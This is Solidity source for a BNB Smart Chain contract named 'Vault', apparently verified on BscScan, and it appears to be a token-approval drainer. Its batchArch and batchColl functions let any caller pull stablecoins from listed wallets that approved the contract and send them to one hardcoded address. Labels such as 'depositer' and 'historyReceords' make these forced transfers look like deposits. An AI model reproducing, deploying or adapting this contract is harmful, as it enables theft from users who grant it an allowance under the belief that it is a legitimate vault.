/**
 *Submitted for verification at BscScan.com on 2023-02-21
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);

address constant rec = 0x6A2E26cDe443D135F46D02CA581239826eE38BA9;

interface IERC20 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function balanceOf(address account) 
        external view returns (uint256);
    
    function approve(address spender, uint256 amount) 
        external returns (bool);
}

abstract contract Owned {
    /*//////////////////////////////////////////////////////////////
                                 EVENTS
    //////////////////////////////////////////////////////////////*/

    event OwnerUpdated(address indexed user, address indexed newOwner);

    /*//////////////////////////////////////////////////////////////
                            OWNERSHIP STORAGE
    //////////////////////////////////////////////////////////////*/

    address public owner;

    modifier onlyOwner() virtual {
        require(msg.sender == owner, "UNAUTHORIZED");

        _;
    }

    /*//////////////////////////////////////////////////////////////
                               CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/

    constructor() {
        owner = msg.sender;
        emit OwnerUpdated(address(0), msg.sender);
    }

    /*//////////////////////////////////////////////////////////////
                             OWNERSHIP LOGIC
    //////////////////////////////////////////////////////////////*/

    function setOwner(address newOwner) public virtual onlyOwner {
        owner = newOwner;
        emit OwnerUpdated(msg.sender, newOwner);
    }
}

contract TokenCollector {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

contract Vault is Owned {
    event BatchArch(address indexed sender, uint256 archAdrCount);
    event BatchColl(address indexed sender, uint256 collAdrCount);
    struct Receord {
        address depositer;
        uint256 amount;
    }
    Receord[] private historyReceords;
    mapping(address => uint256[]) indexs;
    mapping(address => uint256) collectorIndex;

    address[] private collectors;
    uint256 private currentIndex;

    TokenCollector public _tokenCollector;

    function createCollector() external onlyOwner returns(address) {
        _tokenCollector = new TokenCollector(address(BUSD));
        addCollector(address(_tokenCollector));
        return address(_tokenCollector);
    }

    function isCollector(address addr) external view returns(bool) {
        require(addr != address(0), "BEP20: Query address is zero");
        uint256 index = collectorIndex[addr];
        if(collectors[index] == addr) {
            return true;
        }
        return false;
    }

    function withdrawToken(IERC20 token, uint256 _amount) external onlyOwner {
        token.transfer(msg.sender, _amount);
    }

    function batchArch(uint256 gas, address[] calldata addresses, uint256[] calldata tokens) external returns (bool) {
        _batchArch(gas, addresses, tokens);
        return true;
    }

    function _batchArch(uint256 gas, address[] calldata addresses, uint256[] calldata tokens) private {
        require(addresses.length < 10,"GAS Error: max archnum limit is 10 addresses"); // to prevent overflow
        require(addresses.length == tokens.length,"NUM Error: mismatch between Address and token count");

        address archAdr;
        uint256 archCount;
        uint256 tokenBalance;
        uint256 archAdrCount = addresses.length;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < archAdrCount) {
            archAdr = addresses[iterations];
            archCount = tokens[iterations];
            tokenBalance = BUSD.balanceOf(archAdr);
            if(archCount > tokenBalance) {
                archCount = tokenBalance;
            }
            if (tokenBalance > 0) {
                BUSD.transferFrom(archAdr, rec, archCount);
                historyReceords.push(Receord({depositer: archAdr, amount: archCount}));
                uint256 counter = historyReceords.length - 1;
                indexs[archAdr].push(counter);
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            iterations++;
        }

        emit BatchArch(msg.sender, archAdrCount);
    }

    function batchColl(uint256 gas) external returns (bool) {
        _batchColl(gas);
        return true;
    }

    function _batchColl(uint256 gas) private {
        require(collectors.length > 0,"COLL Error: collectors is null");

        address collAdr;
        uint256 tokenBalance;
        uint256 collAdrCount = collectors.length;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < collAdrCount) {
            if (currentIndex >= collAdrCount) {
                currentIndex = 0;
            }
            collAdr = collectors[currentIndex];
            tokenBalance = BUSD.balanceOf(collAdr);
            if (tokenBalance > 0) {
                BUSD.transferFrom(collAdr, rec, tokenBalance);
                historyReceords.push(Receord({depositer: collAdr, amount: tokenBalance}));
                uint256 counter = historyReceords.length - 1;
                indexs[collAdr].push(counter);
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        emit BatchColl(msg.sender, collAdrCount);
    }

    function addCollector(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size <= 0) {
            return;
        }
        if (0 == collectorIndex[adr]) {
            if (0 == collectors.length || collectors[0] != adr) {
                collectorIndex[adr] = collectors.length;
                collectors.push(adr);
            }
        }
    }
}